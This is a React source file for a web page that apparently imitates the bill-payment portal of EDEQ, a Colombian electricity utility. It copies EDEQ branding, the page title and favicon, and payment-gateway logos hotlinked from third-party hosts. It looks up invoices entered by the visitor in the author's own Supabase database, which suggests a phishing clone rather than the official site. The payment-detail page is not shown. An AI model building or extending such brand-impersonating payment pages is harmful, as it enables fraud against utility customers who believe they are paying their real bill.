import React, { useState, useEffect } from 'react';
import logoEdeq from '../assets/images/logo_edeq.png';
import logo2Edeq from '../assets/images/logo2_edeq.png';
import logoPse from '../assets/images/logo_pse.png';
import logoDaviplata from '../assets/images/logo_daviplata.png';
import logoEpay from '../assets/images/logo_epay.png';
import styled from 'styled-components';
import EdeqDetail from './EdeqDetail';
import { supabase } from '../supabaseClient';
import { useNavigate } from 'react-router-dom';
import { usePageTitle } from '../hooks/usePageTitle';
import { useFavicon } from '../hooks/useFavicon';

const tabStyles = {
  border: '2px solid #008a99',
  borderRadius: '24px',
  padding: '2px 20px',
  fontWeight: 700,
  fontSize: 20,
  color: '#fff',
  background: '#008a99',
  cursor: 'pointer',
  outline: 'none',
  marginRight: 3,
  marginLeft: 3,
  transition: 'background 0.2s, color 0.2s',
};
const tabActiveStyles = {
  ...tabStyles,
  background: '#fff',
  color: '#008a99',
};

const TabsContainer = styled.div`
  display: flex;
  justify-content: center;
  margin-top: 110px;
  margin-bottom: 15px;
  margin-left: 12px;
  @media (max-width: 600px) {
    flex-direction: column;
    align-items: center;
    margin-top: 32px;
    margin-left: 0;
    gap: 10px;
  }
`;

const TabButton = styled.button<{ active: boolean }>`
  border: 2px solid #008a99;
  border-radius: 24px;
  padding: 2px 20px;
  font-weight: 700;
  font-size: 20px;
  color: ${props => (props.active ? '#008a99' : '#fff')};
  background: ${props => (props.active ? '#fff' : '#008a99')};
  cursor: pointer;
  outline: none;
  margin: 0 3px;
  transition: background 0.2s, color 0.2s;
  @media (max-width: 600px) {
    width: 80vw;
    max-width: 260px;
    font-size: 15px;
    padding: 6px 0;
    margin: 0;
  }
`;

const Title = styled.div`
  font-weight: 700;
  color: #008a99;
  font-size: 19px;
  margin-bottom: 24px;
  @media (max-width: 600px) {
    font-size: 17px;
    margin-bottom: 16px;
    margin-top: 25px;
  }
`;

const InputWrapper = styled.div`
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 16px auto;
  @media (max-width: 600px) {
    margin-bottom: 10px;
  }
`;

const InputContainer = styled.div`
  display: flex;
  align-items: center;
  border-bottom: 1px solid #222;
  width: 380px;
  @media (max-width: 600px) {
    width: 70vw;
    max-width: 220px;
    border-bottom: 1px solid #222;
  }
`;

const StyledInput = styled.input`
  border: none;
  font-size: 15px;
  padding: 8px 0;
  width: 260px;
  outline: none;
  background: transparent;
  @media (max-width: 600px) {
    font-size: 14px;
    width: 150px;
    padding: 6px 0;
  }
`;

const PolicyText = styled.span`
  font-size: 15px;
  @media (max-width: 600px) {
    font-size: 12px;
  }
`;

const EdeqPage: React.FC = () => {
  usePageTitle('Edeq');
  useFavicon('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABwklEQVR4AdxRQ2AcARTd2nZ7qnupbdu2bduKbdu2bdv2rD1x8mL7mo/bxwNlEASHTDwdT5gplPBiv5ZVcQ8AmDGgA/9jdV4oBS+Acth66EUfhmvGh6J0hosyv5zYD2BKnwcuRSVPjC4Qd1EMXQ2FkBVQCF0JxdBV0I7aB7uUR0WBedKumUxPeUE5cQnAvG6PABiVxfJWtE1+QNOM3AmVejRq4eugFra6vuuPRW6AWexheKc+YxUXmVqxaQn6HFrGr9pKcmnnQ2PKKml3k+guUg6Z0maa8e/yZCKf8T753cIP/6f44PkLF6xUYJyUFO6id608QPNsTMviEGGlYEEAEfBOMl4q8I7f3cJjrifIbXa7scNmP974fam95aKACTK/cNMrLKAm1+k7W2ZmheG3Zbmtn1WTldy2O27DToctOOi0E4edD+CR332WfZaj6UV7MTbl/0XMVRMlGUL6FZ7lWgHxZzicZfeFtMGvLZ9CkAWrwuhxp2KZCcc5ZcXbhRXCQzvMPqRRfm7CPtPfqaks+hayqnJUNRF8HSnm4iQrb1WvDrlmR91cqXOXFAs10/qelDGFMtA4H55YNzag9yQYhjcAAPPzFozWjGUwAAAAAElFTkSuQmCC');
  const [activeTab, setActiveTab] = useState<'factura' | 'somos'>('factura');
  const [checked, setChecked] = useState(false);
  const [inputValue, setInputValue] = useState('');
  const [error, setError] = useState('');
  const navigate = useNavigate();

  useEffect(() => {
    document.body.style.overflowX = 'hidden';
    return () => {
      document.body.style.overflowX = '';
    };
  }, []);

  const handlePayClick = async () => {
    setError('');
    if (!inputValue.trim()) return;

    const { data, error: supaError } = await supabase
      .from('invoices')
      .select('*')
      .eq('payment_reference', inputValue.trim())
      .single();

    if (supaError || !data) {
      setError('Referencia no encontrada o inválida.');
      return;
    }

    navigate('/edeq.detail', { state: { invoiceData: data } });
  };

  return (
    <div style={{ textAlign: 'center', marginTop: 0, overflowX: 'hidden', width: '100vw', maxWidth: '100vw' }}>
      <img
        src={logoEdeq}
        alt="EDEQ"
        className="edeq-header-img"
      />
      <img
        src={logo2Edeq}
        alt="EDEQ Central"
        className="edeq-logo2-img"
      />

      {/* Tabs */}
      <TabsContainer>
        <TabButton active={activeTab === 'factura'} onClick={() => setActiveTab('factura')}>
          PAGAR FACTURA
        </TabButton>
        <TabButton active={activeTab === 'somos'} onClick={() => setActiveTab('somos')} style={{ fontSize: 15 }}>
          Abona a tu crédito SOMOS
        </TabButton>
      </TabsContainer>

      {/* Título */}
      <Title>
        ¡Paga tu factura de EDEQ rápido y seguro!
      </Title>

      {/* Input con ícono */}
      <InputWrapper>
        <InputContainer>
          <img src="https://epayco-sftp-clients.s3.amazonaws.com/edeq/img/page.svg" alt="phone icon" style={{ marginRight: 18, display: 'inline-block', verticalAlign: 'middle' }} />
          <StyledInput
            type="text"
            placeholder="Ingresa tu código NIU."
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
          />
        </InputContainer>
      </InputWrapper>

      {/* Mostrar mensaje de error si existe */}
      {error && <div style={{ color: 'red', marginBottom: 16, fontSize: 14 }}>{error}</div>}

      {/* Botón pagar y texto ePayco */}
      <div style={{ display: 'flex', justifyContent: 'center', margin: '18px 0 8px 0' }}>
        <button
          style={{
            width: '40%',
            minWidth: 120,
            maxWidth: 220,
            background: inputValue.trim() ? '#008a99' : '#eaeaea',
            color: '#fff',
            fontWeight: 700,
            fontSize: 20,
            border: 'none',
            borderRadius: 32,
            padding: '1px 32px',
            cursor: inputValue.trim() ? 'pointer' : 'not-allowed',
            opacity: 1,
            display: 'block',
          }}
          disabled={!inputValue.trim()}
          onClick={handlePayClick}
        >
          PAGAR
        </button>
      </div>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: 16 }}>
        <img src="https://epayco-sftp-clients.s3.amazonaws.com/edeq/img/logo-pasarella.svg" alt="pasarella icon" style={{ height: 18, display: 'inline-block', verticalAlign: 'middle' }} />
      </div>

      {/* Checkbox y política */}
      <div style={{ textAlign: 'left', maxWidth: 420, margin: '0 auto 18px auto', whiteSpace: 'nowrap' }}>
        <label style={{ display: 'flex', alignItems: 'center' }}>
          <input type="checkbox" checked={checked} onChange={e => setChecked(e.target.checked)} style={{ marginRight: 8 }} />
          <PolicyText>
            <strong style={{ fontWeight: 'bold' }}>
              Acepto la{' '}
              <a href="#" style={{ color: '#3fa9f5', textDecoration: 'underline', fontWeight: 500, fontSize: 13 }}>
                política de tratamiento de datos personales
              </a>{' '}
              de EDEQ.
            </strong>
          </PolicyText>
        </label>
      </div>

      {/* Medios de pago */}
      <div style={{ fontWeight: 700, marginBottom: 0, marginTop: 18, fontSize: 13 }}>Medio de pago disponible</div>
      <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: 0, marginBottom: 24, marginTop: -14 }}>
        <img src="https://www.viajescircular.com.co/wp-content/uploads/2021/06/PSE.png" alt="PSE" style={{ height: 90, marginRight: 2 }} />
        <img src="https://linea.ccb.org.co/PasarelaPagos/images/logo-daviplata.svg" alt="Daviplata" style={{ height: 20, marginLeft: 2 }} />
      </div>

      <style>
        {`
          .edeq-header-img {
            width: 100vw;
            display: block;
          }
          .edeq-logo2-img {
            margin: 40px auto 0 auto;
            display: block;
            max-width: 260px;
            width: 100%;
          }

          @media (max-width: 600px) {
            .edeq-header-img {
              height: auto;
              object-fit: contain;
            }
            div[style*='text-align: center'] img {
              height: 40px !important;
            }
            .edeq-logo2-img {
              margin-top: 20px !important;
              margin-bottom: 20px !important;
              width: 50% !important;
              max-width: 215px !important;
              /* height: 150px; */
              height: 100px !important;
              /* object-fit: contain !important; */
            }
            div[style*='marginRight: 18'] img {
              width: 12px !important;
              height: 12px !important;
              margin-right: 12px !important;
            }
            div[style*='height: 15px'][style*='display: inline-block'] img {
              height: 5px !important;
            }
            img[alt="pasarella icon"] {
              height: 12px !important;
            }
            div[style*='justify-content: center'][style*='align-items: center'][style*='margin-bottom: 16'] img[alt="pasarella icon"] {
              height: 15px !important;
            }
            div[style*='text-align: center'] div {
              font-size: 17px !important;
              margin-top: 4px !important;
            }
            .dJzqmF {
              width: 90vw;
              max-width: 335px;
              border-bottom: 1px solid #222;
            }
            .hItQOD {
              width: 85vw;
              max-width: 450px;
              border-bottom: 1px solid #222;
            }
            .jEpOYx {
              width: 80vw;
              max-width: 260px;
              font-size: 15px;
              padding: 6px 0;
              margin: 0;
              margin-top: 90px !important;
            }
            div[style*='justify-content: center'] button {
              width: 65vw !important;
              max-width: 440px !important;
              font-size: 16px !important;
              padding: 7px 0 !important;
              border-radius: 24px !important;
              margin-top: 23px !important;
              margin-right: 10px !important;
              display: block !important;
            }
            .jmLiJM {
              padding: 6px 0 !important;
              margin: 0 !important;
            }
            .fvKMSl {
              padding: 6px 0 !important;
              margin-top: 90px !important;
            }
            .hpXTql {
              padding: 6px 0 !important;
              margin: 0 !important;
            }
            div[style*='font-weight: 700'][style*='margin-bottom: 0'][style*='margin-top: 18'][style*='font-size: 13'] {
              font-size: 11px !important;
            }
            .hVzNxJ {
              font-size: 10px !important;
            }
            div[style*='font-weight: 680'][style*='margin-bottom: 0px'][style*='margin-top: 18px'][style*='font-size: 13px'] {
              font-weight: 680 !important;
            }
            div[style*='justify-content: center'][style*='align-items: center'][style*='gap: 0'][style*='margin-bottom: 24'][style*='margin-top: -14'] img[alt="PSE"] {
              height: 110px !important;
            }
            div[style*='justify-content: center'][style*='align-items: center'][style*='gap: 0'][style*='margin-bottom: 24'][style*='margin-top: -14'] img[alt="Daviplata"] {
              height: 25px !important;
            }
            div[style*='justify-content: center'][style*='align-items: center'][style*='gap: 0'][style*='margin-bottom: 24'][style*='margin-top: -14'] {
              margin-top: -20px !important;
              margin-left: -10px !important;
            }
          }
        `}
      </style>
    </div>
  );
};

export default EdeqPage; 